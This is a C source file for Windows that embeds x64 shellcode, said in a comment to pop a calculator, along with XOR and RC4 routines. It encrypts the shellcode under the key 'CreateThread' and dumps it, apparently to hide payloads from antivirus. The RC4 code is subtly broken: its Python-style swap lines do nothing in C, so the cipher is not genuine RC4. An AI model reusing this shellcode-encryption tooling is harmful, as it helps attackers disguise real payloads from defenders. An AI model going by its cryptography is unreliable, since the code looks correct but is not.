#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "validation.h"
#include "dump.h"

// Shellcode that pops a calculator
const unsigned char shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};


/* ENCRYPTION ALGORITHMS */

// XORs all characters inplace against a variable length key with a slight modification
VOID xorEnc(const char* key, const SIZE_T keyLen, char* src, const SIZE_T srcLen)
{
	for (SIZE_T i = 0; i < srcLen; i++)
		src[i] = src[i] ^ (key[i % keyLen] + i);
}


typedef struct {
	unsigned char s[256];
	SIZE_T i, j;
} rc4_state;

VOID rc4Init(rc4_state* state, const char* key, const SIZE_T keyLen)
{
	for (SIZE_T i = 0; i < 256; i++)
		state->s[i] = i;
	SIZE_T j = 0;
	for (SIZE_T i = 0; i < 256; i++) {
		j = (j + state->s[i] + key[i % keyLen]) % 256;
		state->s[i], state->s[j] = state->s[j], state->s[i];
	}
	state->i, state->j = 0, 0;
}

VOID rc4Enc(const char* key, const SIZE_T keyLen, char* src, const SIZE_T srcLen)
{
	// Initialise RC4 state
	rc4_state state = { 0 };
	rc4Init(&state, key, keyLen);

	for (SIZE_T idx = 0; idx < srcLen; idx++) {
		unsigned char k;

		// Generate pseudorandom key byte by rotating rc4 state
		state.i = (state.i + 1) % 256;
		state.j = (state.j + state.s[state.i]) % 256;
		state.s[state.i], state.s[state.j] = state.s[state.j], state.s[state.i];
		SIZE_T kIdx = (state.s[state.i] + state.s[state.j]) % 256;
		k = state.s[kIdx];

		// XOR with the source
		src[idx] = src[idx] ^ k;
	}
}

/* MAIN FUNCTION */
int main()
{
	if (!validateEncryptDecrypt(&xorEnc, &xorEnc))
		return 1;
	if (!validateEncryptDecrypt(&rc4Enc, &rc4Enc))
		return 1;

	CHAR* buf = (CHAR*)malloc(sizeof(shellcode) * sizeof(char));
	if (buf == NULL)
		return 1;
	memcpy(buf, shellcode, sizeof(shellcode));

	rc4Enc("CreateThread", strlen("CreateThread"), buf, sizeof(shellcode));  // password is "CreateThread"
	shellcodeDump(buf, sizeof(shellcode));
	return 0;
}